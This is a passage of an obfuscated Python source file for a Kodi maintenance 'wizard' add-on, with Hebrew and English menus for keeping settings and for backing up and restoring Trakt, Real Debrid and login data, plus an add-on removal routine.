	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000O00O0OOOOO00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3459
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0OO00OO00000OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3460
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0OO0OOO00OO0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3461
def Menu ():#line:3462
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3463
def saveMenu ():#line:3465
	O00000O0O0O0OO0OO ='[COLOR yellow]מופעל[/COLOR]';OOO0OOO0O000OO0O0 ='[COLOR blue]מבוטל[/COLOR]'#line:3467
	OOO0OOOO00O00OOO0 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3468
	O00O0000000OO00OO ='true'if KEEPMOVIELIST =='true'else 'false'#line:3469
	O0OO00O0OO0O00O0O ='true'if KEEPINFO =='true'else 'false'#line:3470
	OO0OOO0OOOOO00000 ='true'if KEEPSOUND =='true'else 'false'#line:3472
	O0OO00O000OOOOO0O ='true'if KEEPVIEW =='true'else 'false'#line:3473
	O00O0O0OOOO0000O0 ='true'if KEEPSKIN =='true'else 'false'#line:3474
	OO0OOOO0OOOO0000O ='true'if KEEPSKIN2 =='true'else 'false'#line:3475
	OOO00OOO0OOO00OO0 ='true'if KEEPSKIN3 =='true'else 'false'#line:3476
	OOOOO0OOO000OOOO0 ='true'if KEEPADDONS =='true'else 'false'#line:3477
	OOOOOO000OOO0O000 ='true'if KEEPPVR =='true'else 'false'#line:3478
	OO0OOOOOOO0O0OOO0 ='true'if KEEPTVLIST =='true'else 'false'#line:3479
	OOO00OO0O00OOO0O0 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3480
	OOOOOO0OO00O0O000 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3481
	OOOO0O0O00O0O0O00 ='true'if KEEPHUBTV =='true'else 'false'#line:3482
	O0O00O00O0O00O000 ='true'if KEEPHUBVOD =='true'else 'false'#line:3483
	OOO0OOOO0O0OO00O0 ='true'if KEEPHUBSPORT =='true'else 'false'#line:3484
	OO0OOO0O0O0OOOOO0 ='true'if KEEPHUBKIDS =='true'else 'false'#line:3485
	O000OOOO0OO000000 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3486
	OO000OOOOOOO00O00 ='true'if KEEPHUBMENU =='true'else 'false'#line:3487
	OO0O000OOO000O0O0 ='true'if KEEPPLAYLIST =='true'else 'false'#line:3488
	OO00O00OO0O0000O0 ='true'if KEEPTRAKT =='true'else 'false'#line:3489
	O0OOOO0OO0OOOOOOO ='true'if KEEPREAL =='true'else 'false'#line:3490
	O0O00000O0O000OOO ='true'if KEEPRD2 =='true'else 'false'#line:3491
	O0O0OO000000O000O ='true'if KEEPTORNET =='true'else 'true'#line:3492
	O000O00OOOOO00000 ='true'if KEEPLOGIN =='true'else 'false'#line:3493
	O00O0000OOO0O0000 ='true'if KEEPSOURCES =='true'else 'false'#line:3494
	O0OOOOO000O00OO00 ='true'if KEEPADVANCED =='true'else 'false'#line:3495
	OOOOO0000O0O0O00O ='true'if KEEPPROFILES =='true'else 'false'#line:3496
	O0O0O0OOOO0O00000 ='true'if KEEPFAVS =='true'else 'false'#line:3497
	OO0OOOOO0000OOOO0 ='true'if KEEPREPOS =='true'else 'false'#line:3498
	O0OO000OO000000OO ='true'if KEEPSUPER =='true'else 'false'#line:3499
	OOOO00O0OO0OO000O ='true'if KEEPWHITELIST =='true'else 'false'#line:3500
	OOO00OO0000000O00 ='true'if KEEPWEATHER =='true'else 'false'#line:3501
	OOOOOO0000O00OOOO ='true'if KEEPVICTORY =='true'else 'false'#line:3502
	O0O0OOOO00O0O00OO ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3503
	if OOOO00O0OO0OO000O =='true':#line:3505
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3506
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3507
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3508
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3509
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3510
	addFile ('%s שמירת חשבון RD:  '%O0OOOO0OO0OOOOOOO .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3513
	addFile ('%s שמירת חשבון טראקט:  '%OO00O00OO0O0000O0 .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3514
	addFile ('%s שמירת מועדפים:  '%O0O0O0OOOO0O00000 .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3517
	addFile ('%s שמירת לקוח טלוויזיה:  '%OOOOOO000OOO0O000 .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3518
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%OOOOOO0000O00OOOO .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3519
	addFile ('%s שמירת חשבון טלמדיה:  '%O0O0OOOO00O0O00OO .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3520
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%OO0OOOOOOO0O0OOO0 .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3521
	addFile ('%s שמירת אריח סרטים:  '%OOO00OO0O00OOO0O0 .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3522
	addFile ('%s שמירת אריח סדרות:  '%OOOOOO0OO00O0O000 .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3523
	addFile ('%s שמירת אריח טלויזיה:  '%OOOO0O0O00O0O0O00 .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3524
	addFile ('%s שמירת אריח תוכן ישראלי:  '%O0O00O00O0O00O000 .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3525
	addFile ('%s שמירת אריח ספורט:  '%OOO0OOOO0O0OO00O0 .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3526
	addFile ('%s שמירת אריח ילדים:  '%OO0OOO0O0O0OOOOO0 .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3527
	addFile ('%s שמירת אריח מוסיקה:  '%O000OOOO0OO000000 .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3528
	addFile ('%s שמירת תפריט אריחים ראשי:  '%OO000OOOOOOO00O00 .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3529
	addFile ('%s שמירת כל האריחים בסקין:  '%O00O0O0OOOO0000O0 .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3530
	addFile ('%s שמירת הגדרות מזג האוויר:  '%OOO00OO0000000O00 .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3531
	addFile ('%s שמירת הרחבות שהתקנתי:  '%OOOOO0OOO000OOOO0 .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3537
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%O0OO00O0OO0O00O0O .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3538
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%O00O0000000OO00OO .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3541
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%O00O0000OOO0O0000 .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3542
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%OO0OOO0OOOOO00000 .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3543
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%O0OO00O000OOOOO0O .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3545
	addFile ('%s שמירת פליליסט לאודר:  '%OO0O000OOO000O0O0 .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3546
	addFile ('%s שמירת הגדרות באפר: '%O0OOOOO000O00OO00 .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3551
	addFile ('%s שמירת רשימות ריפו:  '%OO0OOOOO0000OOOO0 .replace ('true',O00000O0O0O0OO0OO ).replace ('false',OOO0OOO0O000OO0O0 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3553
	setView ('files','viewType')#line:3555
def traktMenu ():#line:3557
	O00OOO00OOO0O00O0 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3558
	O00000000OOOO000O =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3559
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3560
	addFile ('Save Trakt Data: %s'%O00OOO00OOO0O00O0 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3561
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O00000000OOOO000O ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3562
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3563
	for O00OOO00OOO0O00O0 in traktit .ORDER :#line:3565
		OO0O00O0O0OOO0O00 =TRAKTID [O00OOO00OOO0O00O0 ]['name']#line:3566
		OO000OO0O0OOO0OO0 =TRAKTID [O00OOO00OOO0O00O0 ]['path']#line:3567
		O00O000O00OO0O0OO =TRAKTID [O00OOO00OOO0O00O0 ]['saved']#line:3568
		O0OO000OOO0OO00O0 =TRAKTID [O00OOO00OOO0O00O0 ]['file']#line:3569
		O00000000OOO000OO =wiz .getS (O00O000O00OO0O0OO )#line:3570
		OO0OOO0OO0O0O0000 =traktit .traktUser (O00OOO00OOO0O00O0 )#line:3571
		O0000OOO000OO00OO =TRAKTID [O00OOO00OOO0O00O0 ]['icon']if os .path .exists (OO000OO0O0OOO0OO0 )else ICONTRAKT #line:3572
		O00O00OO00O000OOO =TRAKTID [O00OOO00OOO0O00O0 ]['fanart']if os .path .exists (OO000OO0O0OOO0OO0 )else FANART #line:3573
		OOO00OOOO0O000OO0 =createMenu ('saveaddon','Trakt',O00OOO00OOO0O00O0 )#line:3574
		OOOOO0OO0000000OO =createMenu ('save','Trakt',O00OOO00OOO0O00O0 )#line:3575
		OOO00OOOO0O000OO0 .append ((THEME2 %'%s Settings'%OO0O00O0O0OOO0O00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O00OOO00OOO0O00O0 )))#line:3576
		addFile ('[+]-> %s'%OO0O00O0O0OOO0O00 ,'',icon =O0000OOO000OO00OO ,fanart =O00O00OO00O000OOO ,themeit =THEME3 )#line:3578
		if not os .path .exists (OO000OO0O0OOO0OO0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0000OOO000OO00OO ,fanart =O00O00OO00O000OOO ,menu =OOO00OOOO0O000OO0 )#line:3579
		elif not OO0OOO0OO0O0O0000 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O00OOO00OOO0O00O0 ,icon =O0000OOO000OO00OO ,fanart =O00O00OO00O000OOO ,menu =OOO00OOOO0O000OO0 )#line:3580
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0OOO0OO0O0O0000 ,'authtrakt',O00OOO00OOO0O00O0 ,icon =O0000OOO000OO00OO ,fanart =O00O00OO00O000OOO ,menu =OOO00OOOO0O000OO0 )#line:3581
		if O00000000OOO000OO =="":#line:3582
			if os .path .exists (O0OO000OOO0OO00O0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O00OOO00OOO0O00O0 ,icon =O0000OOO000OO00OO ,fanart =O00O00OO00O000OOO ,menu =OOOOO0OO0000000OO )#line:3583
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O00OOO00OOO0O00O0 ,icon =O0000OOO000OO00OO ,fanart =O00O00OO00O000OOO ,menu =OOOOO0OO0000000OO )#line:3584
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00000000OOO000OO ,'',icon =O0000OOO000OO00OO ,fanart =O00O00OO00O000OOO ,menu =OOOOO0OO0000000OO )#line:3585
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3587
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3588
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3589
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3590
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3591
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3592
	setView ('files','viewType')#line:3593
def realMenu ():#line:3595
	O0OOOO00OO0O0OOO0 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3596
	OOO0OOOO000O00O00 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3597
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3598
	addFile ('Save Real Debrid Data: %s'%O0OOOO00OO0O0OOO0 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3599
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OOO0OOOO000O00O00 ),'',icon =ICONREAL ,themeit =THEME3 )#line:3600
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3601
	for OOOO0OO0O00O0O0OO in debridit .ORDER :#line:3603
		OO0O00OO0OO0OO0O0 =DEBRIDID [OOOO0OO0O00O0O0OO ]['name']#line:3604
		OOO0OO00O00OO0O00 =DEBRIDID [OOOO0OO0O00O0O0OO ]['path']#line:3605
		OO0OO0O0OOO00OOO0 =DEBRIDID [OOOO0OO0O00O0O0OO ]['saved']#line:3606
		OO0OO0000OO0O0000 =DEBRIDID [OOOO0OO0O00O0O0OO ]['file']#line:3607
		OO00OOO00OOO00O0O =wiz .getS (OO0OO0O0OOO00OOO0 )#line:3608
		OO0000000OOO00O0O =debridit .debridUser (OOOO0OO0O00O0O0OO )#line:3609
		O00000O0O0OO0O0O0 =DEBRIDID [OOOO0OO0O00O0O0OO ]['icon']if os .path .exists (OOO0OO00O00OO0O00 )else ICONREAL #line:3610
		OO000OOOO0O0O00OO =DEBRIDID [OOOO0OO0O00O0O0OO ]['fanart']if os .path .exists (OOO0OO00O00OO0O00 )else FANART #line:3611
		OOOOO0O0000OO000O =createMenu ('saveaddon','Debrid',OOOO0OO0O00O0O0OO )#line:3612
		O0O000000O0O0OO00 =createMenu ('save','Debrid',OOOO0OO0O00O0O0OO )#line:3613
		OOOOO0O0000OO000O .append ((THEME2 %'%s Settings'%OO0O00OO0OO0OO0O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OOOO0OO0O00O0O0OO )))#line:3614
		addFile ('[+]-> %s'%OO0O00OO0OO0OO0O0 ,'',icon =O00000O0O0OO0O0O0 ,fanart =OO000OOOO0O0O00OO ,themeit =THEME3 )#line:3616
		if not os .path .exists (OOO0OO00O00OO0O00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00000O0O0OO0O0O0 ,fanart =OO000OOOO0O0O00OO ,menu =OOOOO0O0000OO000O )#line:3617
		elif not OO0000000OOO00O0O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OOOO0OO0O00O0O0OO ,icon =O00000O0O0OO0O0O0 ,fanart =OO000OOOO0O0O00OO ,menu =OOOOO0O0000OO000O )#line:3618
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0000000OOO00O0O ,'authdebrid',OOOO0OO0O00O0O0OO ,icon =O00000O0O0OO0O0O0 ,fanart =OO000OOOO0O0O00OO ,menu =OOOOO0O0000OO000O )#line:3619
		if OO00OOO00OOO00O0O =="":#line:3620
			if os .path .exists (OO0OO0000OO0O0000 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OOOO0OO0O00O0O0OO ,icon =O00000O0O0OO0O0O0 ,fanart =OO000OOOO0O0O00OO ,menu =O0O000000O0O0OO00 )#line:3621
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OOOO0OO0O00O0O0OO ,icon =O00000O0O0OO0O0O0 ,fanart =OO000OOOO0O0O00OO ,menu =O0O000000O0O0OO00 )#line:3622
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO00OOO00OOO00O0O ,'',icon =O00000O0O0OO0O0O0 ,fanart =OO000OOOO0O0O00OO ,menu =O0O000000O0O0OO00 )#line:3623
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3625
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3626
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3627
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3628
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3629
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3630
	setView ('files','viewType')#line:3631
def loginMenu ():#line:3633
	OOOO000O000000OOO ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3634
	OO00O0000OOOOO00O =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3635
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3636
	addFile ('Save Login Data: %s'%OOOO000O000000OOO ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3637
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OO00O0000OOOOO00O ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3638
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3639
	for OOOO000O000000OOO in loginit .ORDER :#line:3641
		O0OO000000OO000O0 =LOGINID [OOOO000O000000OOO ]['name']#line:3642
		OO000OO0O0O00OO0O =LOGINID [OOOO000O000000OOO ]['path']#line:3643
		O0000OOOOO0OOOO0O =LOGINID [OOOO000O000000OOO ]['saved']#line:3644
		O0000OOOOO0OO00O0 =LOGINID [OOOO000O000000OOO ]['file']#line:3645
		O00OO0O0000O0O00O =wiz .getS (O0000OOOOO0OOOO0O )#line:3646
		OO0O0OOO0O0OOOO00 =loginit .loginUser (OOOO000O000000OOO )#line:3647
		OO0OOO0OOOOOOOOOO =LOGINID [OOOO000O000000OOO ]['icon']if os .path .exists (OO000OO0O0O00OO0O )else ICONLOGIN #line:3648
		O00O00000OO0OO0OO =LOGINID [OOOO000O000000OOO ]['fanart']if os .path .exists (OO000OO0O0O00OO0O )else FANART #line:3649
		O0O0O0000OOOOOOOO =createMenu ('saveaddon','Login',OOOO000O000000OOO )#line:3650
		OO0O0O0OOO0OOO000 =createMenu ('save','Login',OOOO000O000000OOO )#line:3651
		O0O0O0000OOOOOOOO .append ((THEME2 %'%s Settings'%O0OO000000OO000O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OOOO000O000000OOO )))#line:3652
		addFile ('[+]-> %s'%O0OO000000OO000O0 ,'',icon =OO0OOO0OOOOOOOOOO ,fanart =O00O00000OO0OO0OO ,themeit =THEME3 )#line:3654
		if not os .path .exists (OO000OO0O0O00OO0O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0OOO0OOOOOOOOOO ,fanart =O00O00000OO0OO0OO ,menu =O0O0O0000OOOOOOOO )#line:3655
		elif not OO0O0OOO0O0OOOO00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OOOO000O000000OOO ,icon =OO0OOO0OOOOOOOOOO ,fanart =O00O00000OO0OO0OO ,menu =O0O0O0000OOOOOOOO )#line:3656
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0O0OOO0O0OOOO00 ,'authlogin',OOOO000O000000OOO ,icon =OO0OOO0OOOOOOOOOO ,fanart =O00O00000OO0OO0OO ,menu =O0O0O0000OOOOOOOO )#line:3657
		if O00OO0O0000O0O00O =="":#line:3658
			if os .path .exists (O0000OOOOO0OO00O0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OOOO000O000000OOO ,icon =OO0OOO0OOOOOOOOOO ,fanart =O00O00000OO0OO0OO ,menu =OO0O0O0OOO0OOO000 )#line:3659
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OOOO000O000000OOO ,icon =OO0OOO0OOOOOOOOOO ,fanart =O00O00000OO0OO0OO ,menu =OO0O0O0OOO0OOO000 )#line:3660
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00OO0O0000O0O00O ,'',icon =OO0OOO0OOOOOOOOOO ,fanart =O00O00000OO0OO0OO ,menu =OO0O0O0OOO0OOO000 )#line:3661
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3663
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3664
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3665
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3666
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3667
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3668
	setView ('files','viewType')#line:3669
def fixUpdate ():#line:3671
	if KODIV <17 :#line:3672
		O00000OO0O0OOO000 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3673
		try :#line:3674
			os .remove (O00000OO0O0OOO000 )#line:3675
		except Exception as O000O0OOOO0OO0O0O :#line:3676
			wiz .log ("Unable to remove %s, Purging DB"%O00000OO0O0OOO000 )#line:3677
			wiz .purgeDb (O00000OO0O0OOO000 )#line:3678
	else :#line:3679
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3680
def removeAddonMenu ():#line:3682
	OOOOO00O00O0OO0O0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3683
	O00OOO0O00000OOO0 =[];O0O0O000O0OOO00O0 =[]#line:3684
	for OO00O0O0OO000OO0O in sorted (OOOOO00O00O0OO0O0 ,key =lambda OO000OO00O00O000O :OO000OO00O00O000O ):#line:3685
		O000O00OO000O0000 =os .path .split (OO00O0O0OO000OO0O [:-1 ])[1 ]#line:3686
		if O000O00OO000O0000 in EXCLUDES :continue #line:3687
		elif O000O00OO000O0000 in DEFAULTPLUGINS :continue #line:3688
		elif O000O00OO000O0000 =='packages':continue #line:3689
		OOOO00OO0O0O0OOO0 =os .path .join (OO00O0O0OO000OO0O ,'addon.xml')#line:3690
		if os .path .exists (OOOO00OO0O0O0OOO0 ):#line:3691
			OO0O0OO00OO0000O0 =open (OOOO00OO0O0O0OOO0 )#line:3692
			OO0O0OO000OOOOO0O =OO0O0OO00OO0000O0 .read ()#line:3693
			OO00OOOOOO00O00OO =wiz .parseDOM (OO0O0OO000OOOOO0O ,'addon',ret ='id')#line:3694
			O0O00OOOOO000O00O =O000O00OO000O0000 if len (OO00OOOOOO00O00OO )==0 else OO00OOOOOO00O00OO [0 ]#line:3696
			try :#line:3697
				O00O00OO00O00OO0O =xbmcaddon .Addon (id =O0O00OOOOO000O00O )#line:3698
				O00OOO0O00000OOO0 .append (O00O00OO00O00OO0O .getAddonInfo ('name'))#line:3699
				O0O0O000O0OOO00O0 .append (O0O00OOOOO000O00O )#line:3700
			except :#line:3701
				pass #line:3702
	if len (O00OOO0O00000OOO0 )==0 :#line:3703
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3704
		return #line:3705
	if KODIV >16 :#line:3706
		O00O0000000OO000O =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O00OOO0O00000OOO0 )#line:3707
	else :#line:3708
		O00O0000000OO000O =[];O00OOO000O0000OOO =0 #line:3709
		O00O00O00O00OO0O0 =["-- Click here to Continue --"]+O00OOO0O00000OOO0 #line:3710
		while not O00OOO000O0000OOO ==-1 :#line:3711
			O00OOO000O0000OOO =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,O00O00O00O00OO0O0 )#line:3712
			if O00OOO000O0000OOO ==-1 :break #line:3713
			elif O00OOO000O0000OOO ==0 :break #line:3714
			else :#line:3715
				O0OOOO00O0000000O =(O00OOO000O0000OOO -1 )#line:3716
				if O0OOOO00O0000000O in O00O0000000OO000O :#line:3717
					O00O0000000OO000O .remove (O0OOOO00O0000000O )#line:3718
					O00O00O00O00OO0O0 [O00OOO000O0000OOO ]=O00OOO0O00000OOO0 [O0OOOO00O0000000O ]#line:3719
				else :#line:3720
					O00O0000000OO000O .append (O0OOOO00O0000000O )#line:3721
					O00O00O00O00OO0O0 [O00OOO000O0000OOO ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O00OOO0O00000OOO0 [O0OOOO00O0000000O ])#line:3722
	if O00O0000000OO000O ==None :return #line:3723
	if len (O00O0000000OO000O )>0 :#line:3724
		wiz .addonUpdates ('set')#line:3725
		for O0O0OO0OO000O0O00 in O00O0000000OO000O :#line:3726
			removeAddon (O0O0O000O0OOO00O0 [O0O0OO0OO000O0O00 ],O00OOO0O00000OOO0 [O0O0OO0OO000O0O00 ],True )#line:3727
		xbmc .sleep (1000 )#line:3729
		if INSTALLMETHOD ==1 :O0O0O0000OOOOO0O0 =1 #line:3731
		elif INSTALLMETHOD ==2 :O0O0O0000OOOOO0O0 =0 #line:3732
